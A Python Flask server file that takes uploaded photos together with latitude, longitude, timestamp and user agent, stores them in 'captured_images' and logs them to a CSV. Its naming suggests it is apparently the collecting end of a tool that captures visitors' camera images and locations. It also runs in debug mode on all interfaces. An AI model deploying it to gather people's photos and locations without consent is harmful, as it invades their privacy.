"""
server.py
- Endpoint POST /upload expects multipart/form-data:
  fields: photo (file), timestamp_wib, latitude, longitude, user_agent
- Saves uploaded photo to captured_images/
- Appends a row to pog.csv (root) with columns:
  Timestamp WIB,Latitude,Longitude,UserAgent,Filename
"""

import os
import csv
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename

# CONFIG
UPLOAD_FOLDER = "captured_images"
LOG_CSV = "pog.csv"
ALLOWED_EXT = {"png", "jpg", "jpeg"}
MAX_CONTENT_LENGTH = 15 * 1024 * 1024  # 15 MB

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app = Flask(__name__, template_folder="templates")
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT

def now_wib_str():
    # Return string YYYY-MM-DD HH:MM:SS in Asia/Jakarta (WIB)
    try:
        # Use offset trick (JS did too). Here use UTC +7 conversion.
        from datetime import timezone, timedelta
        return datetime.utcnow().replace(tzinfo=timezone.utc).astimezone(tz=timezone(timedelta(hours=7))).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

# Ensure CSV header exists
if not os.path.exists(LOG_CSV):
    with open(LOG_CSV, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp WIB", "Latitude", "Longitude", "UserAgent", "Filename"])

@app.route("/upload", methods=["POST"])
def upload():
    try:
        if "photo" not in request.files:
            return "No photo provided", 400
        photo = request.files["photo"]
        if photo.filename == "":
            return "Empty filename", 400
        if not allowed_file(photo.filename):
            return "File type not allowed", 400

        orig_name = secure_filename(photo.filename)
        # prefix with timestamp for uniqueness
        prefix = now_wib_str().replace(":", "-").replace(" ", "_")
        filename = f"{prefix}_{orig_name}"
        save_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
        photo.save(save_path)

        # metadata (from client)
        timestamp_wib = request.form.get("timestamp_wib") or now_wib_str()
        latitude = request.form.get("latitude", "")
        longitude = request.form.get("longitude", "")
        user_agent = request.form.get("user_agent", request.headers.get("User-Agent", ""))

        # append to pog.csv
        with open(LOG_CSV, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp_wib, latitude, longitude, user_agent, filename])

        return jsonify({"status": "ok", "filename": filename}), 200
    except Exception as e:
        # Return error for debug (in prod, log instead)
        return str(e), 500

# optional: serve saved images for dev
@app.route("/captured_images/<path:filename>")
def serve_image(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)

if __name__ == "__main__":
    # set PORT env if platform (Replit)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
